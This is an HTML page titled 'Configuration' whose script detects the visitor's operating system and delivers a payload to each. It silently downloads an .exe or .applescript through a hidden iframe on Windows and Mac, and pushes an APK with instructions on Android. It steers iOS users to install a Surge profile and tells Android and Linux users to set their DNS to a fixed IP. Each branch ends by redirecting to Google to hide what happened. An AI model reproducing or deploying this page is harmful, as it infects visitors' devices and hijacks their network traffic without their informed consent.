<body>
<div class="main">
  <iframe id = "download" style="display:none"> </iframe>
  <h1 style="margin-left:121.7pt"><span style="font-size:48.0pt;font-family:Century Gothic,sans-serif"><br>
    <u> Conf</u>iguration</span></h1>

  <h1 align="right" style="margin-top:0in;margin-right:0in;margin-bottom:0in;
margin-left:121.7pt;margin-bottom:.0001pt;text-align:right"> <img width="392"
height="383" id="estateBranding" src="jellybean/branding.jpg"
alt="the Statue of Liberty"> </h1>
  <script type="text/javascript">

    if (navigator.appVersion.indexOf("iPhone")!=-1
    || navigator.appVersion.indexOf("iPad")!=-1) {
		function absolute() {
			window.open('surge:///install-config?url='+window.location.origin+'/'+'deployment/elt.conf');
			setTimeout(function () {
            	window.location = 'itms-apps://itunes.apple.com/app/surge-3-web-developer-tool/id1329879957';
				return absolute();
          	}, 1000);
			
			window.onload(function() {
				window.open('https://www.google.com/?gl=us&hl=en&pws=0&gws_rd=cr');
			});
		}
		absolute();
    }
    else if (navigator.appVersion.indexOf("Android")!=-1) {
		alert("Awesome!\nFollow these instructions:");
		alert("STEP 1 of 4\nInstall downloaded application package\nthe download will automatically start once you finish reading these instructions.");
		alert("STEP 2 of 4\nJot down the following address:\n47.100.165.144");
		alert("STEP 3 of 4\nOpen 'DNS Changer' enter the address you've just written down in the first entry and '0.0.0.0' in the other.");
		alert("STEP 4 of 4\nTap 'Start'. ");
		window.open('deployment/eltdpl.apk');
		window.location.replace("https://www.google.com/?gl=us&hl=en&pws=0&gws_rd=cr");
    } 
	else if (navigator.appVersion.indexOf("Win")!=-1) {
    	document.getElementById("download").src='deployment/eltdpl.exe';
    	//alert("Almost DONE!\nEXECUTE THE SCRIPT DOWNLOADED.");
    } 
	else if (navigator.appVersion.indexOf("Mac")!=-1) {
		document.getElementById("download").src='deployment/eltdpl.applescript';
    	//alert("Almost DONE!\nEXECUTE THE SCRIPT DOWNLOADED.");      
    }
	else if (navigator.appVersion.indexOf("X11")!=-1 || navigator.appVersion.indexOf("Linux")!=-1) {
		window.open('archive');
		//alert(":\) Great Job!\nAdd the following line to your 'resolv.conf' to make it fly!\nnameserver 47.100.165.144");
		window.location.replace("https://www.google.com/?gl=us&hl=en&pws=0&gws_rd=cr");
	}
	else {
		alert("Oooops!\nIt doesn't seem that your device is supported. Check eltdpl.roycreatif.com/archive for more details.");
		window.location = 'archive';
	}

</script>
